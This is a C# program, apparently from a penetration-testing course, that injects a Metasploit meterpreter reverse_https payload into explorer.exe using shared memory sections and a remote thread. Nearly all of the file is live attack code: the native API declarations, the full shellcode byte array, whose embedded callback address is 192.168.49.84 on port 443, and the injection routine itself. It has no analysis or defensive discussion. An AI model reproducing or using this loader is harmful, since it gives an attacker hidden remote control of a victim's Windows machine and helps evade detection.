﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace Inject
{
    class Program
    {
        // Use P/Invoke to import DLLs for Win32 APIs
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            out long SectionOffset,
            out long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc, 
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public enum SectionMapEnum
        // Define access masks for section objects
        // https://referencesource.microsoft.com/#windowsbase/Shared/MS/Win32/UnsafeNativeMethodsOther.cs,17bcbebb013dd52d
        {
            SECTION_MAP_READ = 0x4,
            SECTION_MAP_WRITE = 0x2,
            SECTION_MAP_EXECUTE = 0x8,
            SECTION_MAP_RWX = 0xe
        }

        public enum SectionPageProtectionEnum
        // Define memory protection values for sections
        // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
        {
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.84 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[795] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x49,0x01,0xd0,0x50,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x41,
0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x41,0x58,0x48,0x01,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x38,0x34,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
0x00,0x00,0x00,0xff,0xd5,0xe8,0xf1,0x00,0x00,0x00,0x2f,0x35,0x4d,0x75,0x69,
0x4b,0x53,0x4a,0x6b,0x4a,0x43,0x31,0x51,0x6c,0x56,0x47,0x58,0x4d,0x4d,0x4e,
0x31,0x63,0x67,0x30,0x6a,0x32,0x69,0x47,0x6e,0x41,0x70,0x46,0x7a,0x49,0x34,
0x74,0x4f,0x79,0x62,0x6c,0x7a,0x79,0x32,0x47,0x67,0x38,0x4f,0x4d,0x44,0x63,
0x54,0x5f,0x4e,0x33,0x42,0x56,0x39,0x73,0x64,0x33,0x48,0x7a,0x49,0x77,0x5f,
0x53,0x77,0x76,0x79,0x53,0x56,0x57,0x36,0x64,0x33,0x48,0x67,0x4d,0x65,0x7a,
0x56,0x35,0x78,0x4f,0x65,0x66,0x79,0x73,0x65,0x75,0x45,0x50,0x68,0x50,0x34,
0x32,0x34,0x7a,0x67,0x74,0x57,0x64,0x6d,0x73,0x51,0x46,0x34,0x69,0x31,0x63,
0x45,0x6d,0x74,0x48,0x62,0x6e,0x75,0x75,0x43,0x43,0x6e,0x74,0x33,0x35,0x6f,
0x6d,0x51,0x74,0x6e,0x5f,0x70,0x58,0x4c,0x76,0x48,0x6a,0x59,0x36,0x48,0x4b,
0x6b,0x6a,0x4c,0x32,0x59,0x37,0x65,0x32,0x74,0x37,0x6b,0x71,0x30,0x39,0x5a,
0x4e,0x48,0x31,0x62,0x70,0x54,0x41,0x32,0x53,0x70,0x66,0x4a,0x57,0x56,0x70,
0x4a,0x6c,0x38,0x75,0x2d,0x42,0x4f,0x6c,0x67,0x4e,0x35,0x51,0x65,0x6b,0x44,
0x46,0x55,0x34,0x69,0x32,0x6e,0x34,0x46,0x36,0x36,0x67,0x72,0x73,0x7a,0x56,
0x4f,0x50,0x57,0x31,0x51,0x4a,0x31,0x41,0x66,0x35,0x6e,0x50,0x41,0x6a,0x34,
0x68,0x43,0x42,0x68,0x64,0x44,0x4f,0x76,0x46,0x79,0x48,0x5a,0x63,0x38,0x61,
0x6f,0x50,0x44,0x5a,0x70,0x4f,0x6d,0x56,0x4d,0x6e,0x00,0x48,0x89,0xc1,0x53,
0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,
0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,
0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,
0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,
0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,
0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,
0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,
0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,
0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,
0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,
0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,
0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,
0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,
0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,
0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };
            long bufSize = buf.Length;

            // Create a new RWX memory section
            IntPtr pSectionHandle = IntPtr.Zero;
            UInt32 createSectionResult = NtCreateSection(ref pSectionHandle, (uint)SectionMapEnum.SECTION_MAP_RWX, IntPtr.Zero, ref bufSize, (uint)SectionPageProtectionEnum.PAGE_EXECUTE_READWRITE, 0x8000000, IntPtr.Zero);
            if (createSectionResult == 0 && pSectionHandle != IntPtr.Zero)
            {
                Console.WriteLine("[+] Successfully created section.");
                Console.WriteLine("[-] pSectionHandle: 0x" + String.Format("{0:X}", (pSectionHandle).ToInt64()));
            } 
            else
            {
                Console.WriteLine("[!] Failed to create section.");
            }

            // Map a RW view of the section for the local process
            IntPtr pLocalSectionAddress = IntPtr.Zero;
            long lSectionOffset = 0;
            UInt32 localMapViewResult = NtMapViewOfSection(pSectionHandle, GetCurrentProcess(), ref pLocalSectionAddress, IntPtr.Zero, IntPtr.Zero, out lSectionOffset, out bufSize, 0x2, 0, (uint)SectionPageProtectionEnum.PAGE_READWRITE);
            if (localMapViewResult == 0 && pLocalSectionAddress != IntPtr.Zero)
            {
                Console.WriteLine("[+] Successfully created section view with PAGE_READWRITE access.");
                Console.WriteLine("[-] pLocalSectionAddress: 0x" + String.Format("{0:X}", (pLocalSectionAddress).ToInt64()));
            }
            else
            {
                Console.WriteLine("[!] Failed to map view of section to local process.");
            }

            // Copy shellcode into the section
            Marshal.Copy(buf, 0, pLocalSectionAddress, buf.Length);

            // Get PID of explorer.exe for our user and get a handle on the remote process
            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
            int iTargetPid = explorerProcesses[0].Id;
            IntPtr pTargetProcessHandle = OpenProcess(0x001F0FFF, false, iTargetPid);

            // Map a RX view of the section for the remote process
            IntPtr pRemoteSectionAddress = IntPtr.Zero;
            UInt32 remoteMapViewResult = NtMapViewOfSection(pSectionHandle, pTargetProcessHandle, ref pRemoteSectionAddress, IntPtr.Zero, IntPtr.Zero, out lSectionOffset, out bufSize, 0x2, 0, (uint)SectionPageProtectionEnum.PAGE_EXECUTE_READ);
            if (remoteMapViewResult == 0 && pRemoteSectionAddress != IntPtr.Zero)
            {
                Console.WriteLine("[+] Successfully created section view with PAGE_EXECUTE_READ access.");
                Console.WriteLine("[-] pRemoteSectionAddress: 0x" + String.Format("{0:X}", (pRemoteSectionAddress).ToInt64()));
            }
            else
            {
                Console.WriteLine("[!] Failed to map view of section to remote process.");
            }

            // Create a thread in the remote process to execute the shellcode at the mapped view of the section address
            IntPtr hThread = CreateRemoteThread(pTargetProcessHandle, IntPtr.Zero, 0, pRemoteSectionAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }

    }
}